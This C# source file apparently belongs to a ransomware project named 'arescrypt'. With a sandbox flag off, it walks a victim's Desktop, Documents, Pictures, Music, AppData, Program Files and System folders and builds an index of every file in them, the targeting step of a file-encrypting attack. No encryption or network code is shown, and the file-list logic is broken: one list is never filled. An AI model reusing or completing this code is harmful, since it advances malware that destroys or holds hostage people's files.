// Imports/Libraries
using System;
using System.Collections.Generic;

namespace arescrypt
{
    class Program
    {
        public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
        public static string sessionUsername = Environment.UserName; // get current sessions username
        private static bool sandBox = true; // Safemode for testing/debugging

        static void Main(string[] args)
        {
#if DEBUG
            Console.WriteLine("Hello, " + sessionUsername + ". DEBUG mode has been enabled.");
#else
            Console.WriteLine("Hello, " + sessionUsername + ". RELEASE mode has been enabled.");
#endif

            var userSpecificDirs = new List<string> { "" };
            var systemSpecificDirs = new List<string> { "" };
            string[] fullFileIndex = default(string[]);

            if (sandBox) // == true
                userSpecificDirs.Add(@"sandboxedDirectory/");
            else if (!sandBox)
            {
                // User specific directories, administrative rights shouldn't be required in order to write to these files
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

                // System specific directories, administrative rights may be required in order to write to these files
                systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
                systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
                systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
            }


            var userSpecificFiles = new List<string> { };
            var systemSpecificFiles = new List<string> { };

            foreach (string dir in userSpecificDirs)
                foreach (string file in FileHandler.DirSearch(dir))
                    Console.WriteLine(file);
            if (sandBox) // == true
                fullFileIndex = userSpecificFiles.ToArray();
            else if (!sandBox) // == false
            {   // Get file index from both Lists' and spawn a Full File Index of all files in every subdirectory
                foreach (string dir in systemSpecificDirs)
                    foreach (string file in FileHandler.DirSearch(dir))
                        systemSpecificFiles.Add(file);
                fullFileIndex = Misc.concatList(userSpecificFiles, systemSpecificFiles).ToArray();
            }

            foreach (string file in fullFileIndex)
                Console.WriteLine(file);

            Console.Write("\nPress any key to continue . . . ");
            Console.ReadKey(); // Hang the console
        }
    }
}
